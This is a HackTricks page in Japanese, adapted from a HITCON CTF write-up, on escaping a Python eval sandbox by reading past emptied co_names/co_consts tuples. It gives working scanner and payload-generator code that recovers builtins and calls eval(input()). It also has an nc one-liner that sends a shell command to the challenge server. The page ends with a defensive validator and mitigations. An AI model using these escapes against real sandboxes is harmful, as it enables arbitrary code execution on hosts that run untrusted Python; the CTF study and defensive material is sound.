# LOAD_NAME / LOAD_CONST opcode OOB Read

{{#include ../../../banners/hacktricks-training.md}}

このページでは、Splitline による HITCON CTF 2022「V O I D」の元の writeup と exploit chain を応用しています。<sup>[[1]](#references)</sup>

### TL;DR <a href="#tldr-2" id="tldr-2"></a>

`LOAD_NAME` または `LOAD_CONST` のオペランドは、意図的に短縮された `co_names` または `co_consts` tuple の外側を読み取ることができます。この challenge では、近くのエントリに `__getattribute__` などの有用な attribute が含まれるまで、到達不能な dummy names が使用されます。<sup>[[1]](#references)</sup>

残りの payload では、取得した name を再利用して sandbox escape を構築します。<sup>[[1]](#references)</sup>

### Overview <a href="#overview-1" id="overview-1"></a>

challenge wrapper は短く、評価する前に1つの expression を compile します。<sup>[[1]](#references)</sup>
```python
source = input('>>> ')
if len(source) > 13337: exit(print(f"{'L':O<13337}NG"))
code = compile(source, '∅', 'eval').replace(co_consts=(), co_names=())
print(eval(code, {'__builtins__': {}}))
```
入力は Python code object にコンパイルされ、その後 wrapper が `eval` を呼び出す前に、`co_consts` と `co_names` を空の tuple に置き換えます。<sup>[[1]](#references)[[5]](#references)</sup>

生成された instruction がこれらの table のいずれかを依然として index すると、build によっては interpreter が crash したり、隣接する object pointer が expose されたりします。<sup>[[1]](#references)</sup>

### 範囲外読み取り <a href="#out-of-bound-read" id="out-of-bound-read"></a>

segfault はどのように発生するのでしょうか？

`[a, b, c]` のような list expression では、compiler は連続した operand を持つ `LOAD_NAME` instruction を生成します。<sup>[[1]](#references)[[2]](#references)</sup>
```
1           0 LOAD_NAME                0 (a)
2 LOAD_NAME                1 (b)
4 LOAD_NAME                2 (c)
6 BUILD_LIST               3
8 RETURN_VALUE
```
`co_names` を `()` に置き換えても、バイトコードには `LOAD_NAME 2` が残ります。そのため、未検査のタプルアクセスによって `IndexError` を発生させる代わりに、タプルの外部にあるポインタを取得できます。<sup>[[1]](#references)[[3]](#references)</sup>

`LOAD_NAME` と `LOAD_CONST` はここでの中核となるプリミティブです。それぞれの整数オペランドによって、`co_names` と `co_consts` 内のエントリが選択されます。<sup>[[1]](#references)[[2]](#references)</sup>

CPython のディスパッチでは、`LOAD_CONST` が選択されたタプルエントリを取得してプッシュします。リリースビルドでは、未検査のタプルアクセサが使用されます。<sup>[[3]](#references)</sup>
```c
case TARGET(LOAD_CONST): {
PREDICTED(LOAD_CONST);
PyObject *value = GETITEM(consts, oparg);
Py_INCREF(value);
PUSH(value);
FAST_DISPATCH();
}
```
対象の interpreter で `LOAD_NAME` のオペランドを増加させながら調査し、有用なエントリをマッピングします。Splitline は challenge 環境で 700 を超える位置に有用なオフセットがあることを確認しましたが、配置は build ごとに異なります。debugger を使うと、周辺メモリの調査に役立ちます。<sup>[[1]](#references)</sup>

### Exploit の生成 <a href="#generating-the-exploit" id="generating-the-exploit"></a>

オフセットから有用な name が得られたら、到達不能な式内に範囲外 lookup を配置し、到達可能な attribute access から同じ `co_names` スロットを参照します。<sup>[[1]](#references)</sup>

たとえば、オフセット 5 から `__getattribute__` が得られる場合は、その name をスロット 5 に保持し、false branch で有用な lookup を実行します。<sup>[[1]](#references)</sup>
```python
[a,b,c,d,e,__getattribute__] if [] else [
[].__getattribute__
# you can get the __getattribute__ method of list object now!
]
```
> 復元されるテキストは `__getattribute__` である必要はなく、payload の役割を果たす任意の identifier がそのスロットを占有できます。<sup>[[1]](#references)</sup>

compiler は、1つの name が繰り返し出現する場合に `co_names` スロットを再利用します。disassembly にその様子が示されています。<sup>[[1]](#references)[[2]](#references)</sup>
```python
0 BUILD_LIST               0
2 POP_JUMP_IF_FALSE       20
>>    4 LOAD_NAME                0 (a)
>>    6 LOAD_NAME                1 (b)
>>    8 LOAD_NAME                2 (c)
>>   10 LOAD_NAME                3 (d)
>>   12 LOAD_NAME                4 (e)
>>   14 LOAD_NAME                5 (__getattribute__)
16 BUILD_LIST               6
18 RETURN_VALUE
20 BUILD_LIST               0
>>   22 LOAD_ATTR                5 (__getattribute__)
24 BUILD_LIST               1
26 RETURN_VALUE
```
`LOAD_ATTR` も `co_names` を通じて名前を解決するため、到達可能な分岐ではそのスロットを再利用できます。新しい CPython バージョンでの packed operands については、以下の version notes で説明しています。<sup>[[1]](#references)[[2]](#references)</sup>

定数を使わずに、boolean expressions から小さな非負整数を合成できます。<sup>[[1]](#references)</sup>

- 0: not \[\[]]
- 1: not \[]
- 2: (not \[]) + (not \[])
- ...

### Exploit Script <a href="#exploit-script-1" id="exploit-script-1"></a>

元の exploit では、challenge の長さ制限内に収めるため、constants ではなく names を使用していました。<sup>[[1]](#references)</sup>

この helper は、空の `co_names` tuple を持つ code object を構築することで、候補となる name offsets をスキャンします。<sup>[[1]](#references)</sup>
```python
from types import CodeType
from opcode import opmap
from sys import argv


class MockBuiltins(dict):
def __getitem__(self, k):
if type(k) == str:
return k


if __name__ == '__main__':
n = int(argv[1])

code = [
*([opmap['EXTENDED_ARG'], n // 256]
if n // 256 != 0 else []),
opmap['LOAD_NAME'], n % 256,
opmap['RETURN_VALUE'], 0
]

c = CodeType(
0, 0, 0, 0, 0, 0,
bytes(code),
(), (), (), '<sandbox>', '<eval>', 0, b'', ()
)

ret = eval(c, {'__builtins__': MockBuiltins()})
if ret:
print(f'{n}: {ret}')

# for i in $(seq 0 10000); do python find.py $i ; done
```
以下のジェネレーターは、復元したオフセットを名前に対応付け、ソースレベルのペイロードを出力します。<sup>[[1]](#references)</sup>
```python
import sys
import unicodedata


class Generator:
# get numner
def __call__(self, num):
if num == 0:
return '(not[[]])'
return '(' + ('(not[])+' * num)[:-1] + ')'

# get string
def __getattribute__(self, name):
try:
offset = None.__dir__().index(name)
return f'keys[{self(offset)}]'
except ValueError:
offset = None.__class__.__dir__(None.__class__).index(name)
return f'keys2[{self(offset)}]'


_ = Generator()

names = []
chr_code = 0
for x in range(4700):
while True:
chr_code += 1
char = unicodedata.normalize('NFKC', chr(chr_code))
if char.isidentifier() and char not in names:
names.append(char)
break

offsets = {
"__delitem__": 2800,
"__getattribute__": 2850,
'__dir__': 4693,
'__repr__': 2128,
}

variables = ('keys', 'keys2', 'None_', 'NoneType',
'm_repr', 'globals', 'builtins',)

for name, offset in offsets.items():
names[offset] = name

for i, var in enumerate(variables):
assert var not in offsets
names[792 + i] = var


source = f'''[
({",".join(names)}) if [] else [],
None_ := [[]].__delitem__({_(0)}),
keys := None_.__dir__(),
NoneType := None_.__getattribute__({_.__class__}),
keys2 := NoneType.__dir__(NoneType),
get := NoneType.__getattribute__,
m_repr := get(
get(get([],{_.__class__}),{_.__base__}),
{_.__subclasses__}
)()[-{_(2)}].__repr__,
globals := get(m_repr, m_repr.__dir__()[{_(6)}]),
builtins := globals[[*globals][{_(7)}]],
builtins[[*builtins][{_(19)}]](
builtins[[*builtins][{_(28)}]](), builtins
)
]'''.strip().replace('\n', '').replace(' ', '')

print(f"{len(source) = }", file=sys.stderr)
print(source)

# (python exp.py; echo '__import__("os").system("sh")'; cat -) | nc challenge.server port
12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273
```
大まかには、生成されたpayloadは関数のglobalsを取得し、`builtins`を復元して、`eval(input())`を呼び出します。<sup>[[1]](#references)</sup>
```python
getattr = (None).__getattribute__('__class__').__getattribute__
builtins = getattr(
getattr(
getattr(
[].__getattribute__('__class__'),
'__base__'),
'__subclasses__'
)()[-2],
'__repr__').__getattribute__('__globals__')['builtins']
builtins['eval'](builtins['input']())
```
---

### Version notes and affected opcodes (Python 3.11–3.13)

- CPython 3.11–3.13 では、命令は引き続き整数オペランドを使用して、code object の constant table と name table のインデックスを指定します。いずれかの tuple が参照されたインデックスより短い場合、チェックされていないアクセスによって隣接する object pointer が読み取られ、それを使って crash したり処理を実行したりする可能性があります。正確な挙動は interpreter build によって異なります。<sup>[[2]](#references)[[3]](#references)</sup>
- `LOAD_CONST consti` と (3.12+) `RETURN_CONST consti` は `co_consts[consti]` を読み取ります。<sup>[[2]](#references)</sup>
- name table を直接使用するものには、`LOAD_NAME`、`STORE_NAME`、`DELETE_NAME`、`STORE_GLOBAL`、`DELETE_GLOBAL`、`IMPORT_NAME`、`IMPORT_FROM`、`STORE_ATTR`、`DELETE_ATTR`、および (3.12+) `LOAD_FROM_DICT_OR_GLOBALS` があります。<sup>[[2]](#references)</sup>
- `LOAD_GLOBAL namei` と `LOAD_ATTR namei` は `co_names[namei >> 1]` を使用します。low bit は documented NULL/method behavior を制御します。(3.12+) `LOAD_SUPER_ATTR namei` は `co_names[namei >> 2]` を使用し、low bits に2つの flag をパックします。<sup>[[2]](#references)</sup>
- Python 3.11+ では adaptive/inline caches が導入され、命令の間に hidden `CACHE` entries が追加されます。handcrafted bytecode を作成する際は、`co_code` の構築時にこれらの entries を考慮する必要があります。<sup>[[2]](#references)</sup>

実用上の意味：bytecode の layout と復元した offsets は、release と build に固有です。この technique や生成した payload に依存する前に、対象の CPython version に対してテストしてください。<sup>[[2]](#references)</sup>

### 有用な OOB indexes 用の Quick scanner (3.11+/3.12+ compatible)

high-level source ではなく bytecode から直接 interesting objects を探したい場合は、最小限の code objects を生成し、indexes を brute-force できます。以下の helper は、対象 interpreter の `dis` metadata に従って inline caches を挿入します。<sup>[[2]](#references)</sup>
```python
import dis, types

def assemble(ops):
# ops: list of (opname, arg) pairs
cache = bytes([dis.opmap.get("CACHE", 0), 0])
out = bytearray()
for op, arg in ops:
opc = dis.opmap[op]
out += bytes([opc, arg])
# Python >=3.11 inserts per-opcode inline cache entries
ncache = getattr(dis, "_inline_cache_entries", {}).get(opc, 0)
out += cache * ncache
return bytes(out)

# Reuse an existing function's code layout to simplify CodeType construction
base = (lambda: None).__code__

# Example: probe co_consts[i] with LOAD_CONST i and return it
# co_consts/co_names are intentionally empty so LOAD_* goes OOB

def probe_const(i):
code = assemble([
("RESUME", 0),          # 3.11+
("LOAD_CONST", i),
("RETURN_VALUE", 0),
])
c = base.replace(co_code=code, co_consts=(), co_names=())
try:
return eval(c)
except Exception:
return None

for idx in range(0, 300):
obj = probe_const(idx)
if obj is not None:
print(idx, type(obj), repr(obj)[:80])
```
Notes
- 代わりに names を probe するには、`LOAD_CONST` を `LOAD_NAME`/`LOAD_GLOBAL`/`LOAD_ATTR` に置き換え、対象 opcode に合わせて stack の使用方法と packed operand を調整します。<sup>[[2]](#references)</sup>
- 必要に応じて、`EXTENDED_ARG` または `arg` の複数バイトを使用して、255 を超える index に到達します。この helper は operand の下位バイトのみを出力するため、より大きな index には raw byte の構築または複数回の load が必要です。<sup>[[2]](#references)</sup>

### Minimal bytecode-only RCE pattern (co_consts OOB → builtins → eval/input)

`co_consts` index が builtins module に解決されることを特定したら、stack を操作することで、`co_names` を使わずに `eval(input())` を再構築できます。公式の B01lers CTF 2024 `awpcode` の資料では、この同じ OOB-read pattern が解説されています。<sup>[[4]](#references)</sup>
```python
# Build co_code that:
# 1) LOAD_CONST <builtins_idx> → push builtins module
# 2) Use stack shuffles and BUILD_TUPLE/UNPACK_EX to peel strings like 'input'/'eval'
#    out of objects living nearby in memory (e.g., from method tables),
# 3) BINARY_SUBSCR to do builtins["input"] / builtins["eval"], CALL each, and RETURN_VALUE
# This pattern is the same idea as the high-level exploit above, but expressed in raw bytecode.
```
このスタックのみのアプローチは、challenge で `co_code` を直接制御できる一方、`co_consts=()` と `co_names=()` を強制される場合に有用です。ソースレベルの tricks を回避し、bytecode のスタック操作と tuple builders を使用して payload を小さく保てます。<sup>[[4]](#references)</sup>

### sandbox の Defensive checks と mitigations

untrusted code を compile または evaluate する Python sandbox を作成する場合、bytecode で使用される tuple indexes の bounds-checking を CPython に依存しないでください。実行前に code objects を validate してください。<sup>[[2]](#references)[[3]](#references)</sup>

Practical validator（`co_consts`/`co_names` への OOB access を reject）。<sup>[[2]](#references)</sup>
```python
import dis

def max_name_index(code):
max_idx = -1
direct_name_ops = {
"LOAD_NAME", "STORE_NAME", "DELETE_NAME", "STORE_GLOBAL", "DELETE_GLOBAL",
"IMPORT_NAME", "IMPORT_FROM", "STORE_ATTR", "DELETE_ATTR",
"LOAD_FROM_DICT_OR_GLOBALS",
}
for ins in dis.get_instructions(code):
if ins.opname in direct_name_ops | {"LOAD_ATTR", "LOAD_GLOBAL", "LOAD_SUPER_ATTR"}:
namei = ins.arg or 0
# 3.11+: LOAD_ATTR/LOAD_GLOBAL pack one flag; LOAD_SUPER_ATTR packs two.
if ins.opname in {"LOAD_ATTR", "LOAD_GLOBAL"}:
namei >>= 1
elif ins.opname == "LOAD_SUPER_ATTR":
namei >>= 2
max_idx = max(max_idx, namei)
return max_idx

def max_const_index(code):
return max([ins.arg for ins in dis.get_instructions(code)
if ins.opname in {"LOAD_CONST", "RETURN_CONST"}] + [-1])

def validate_code_object(code: type((lambda:0).__code__)):
if max_const_index(code) >= len(code.co_consts):
raise ValueError("Bytecode refers to const index beyond co_consts length")
if max_name_index(code) >= len(code.co_names):
raise ValueError("Bytecode refers to name index beyond co_names length")

# Example use in a sandbox:
# src = input(); c = compile(src, '<sandbox>', 'exec')
# c = c.replace(co_consts=(), co_names=())       # if you really need this, validate first
# validate_code_object(c)
# eval(c, {'__builtins__': {}})
```
追加の mitigation ideas
- 信頼できない入力に対して任意の `CodeType.replace(...)` を許可しないか、生成される code object に対して厳格な構造チェックを追加する。
- CPython のセマンティクスに依存するのではなく、OS-level sandboxing（seccomp、job objects、containers）を使用した separate process で untrusted code を実行することを検討する。

## References

- [1] [Splitline の HITCON CTF 2022 writeup「V O I D」（この technique と high-level exploit chain の発端）](https://blog.splitline.tw/hitcon-ctf-2022/)
- [2] [Python 3.13 `dis` documentation（bytecode indices、packed name operands、inline caches）](https://docs.python.org/3.13/library/dis.html)
- [3] [CPython 3.13.5 tuple-access macros（`GETITEM`）](https://github.com/python/cpython/blob/v3.13.5/Python/ceval_macros.h#L133-L143)
- [4] [B01lers CTF 2024 `awpcode` challenge writeup（CygnusX）](https://github.com/b01lers/b01lers-ctf-2024-public/tree/main/misc/awpcode)
- [5] [Python C API: Code Objects](https://docs.python.org/3/c-api/code.html)
{{#include ../../../banners/hacktricks-training.md}}
